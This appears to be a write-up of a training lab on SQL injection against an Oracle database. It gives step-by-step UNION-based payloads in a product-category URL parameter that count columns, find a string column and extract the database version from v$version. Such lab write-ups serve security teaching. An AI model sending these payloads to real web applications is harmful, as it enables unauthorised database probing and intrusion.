Difficulty : `Practitioner`

## ðŸŽ¯ Goal

To solve the lab, display the Oracle database version string.

## âœ… Solution

> On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like: `' UNION SELECT NULL FROM DUAL--`

Number of columns:

````text
<website>/filter?category=Pets' UNION SELECT NULL FROM DUAL--    # error!
<website>/filter?category=Pets' UNION SELECT NULL,NULL FROM DUAL--    # works
<website>/filter?category=Pets' UNION SELECT NULL,NULL,NULL FROM DUAL--    # error!
````

Is one column containing string?

````text
<website>/filter?category=Pets' UNION SELECT 'abc',NULL FROM DUAL--    # works
````

Full payload:

````text
<website>/filter?category=Pets' UNION SELECT banner,NULL FROM v$version--
````

The database type and version are displayed.
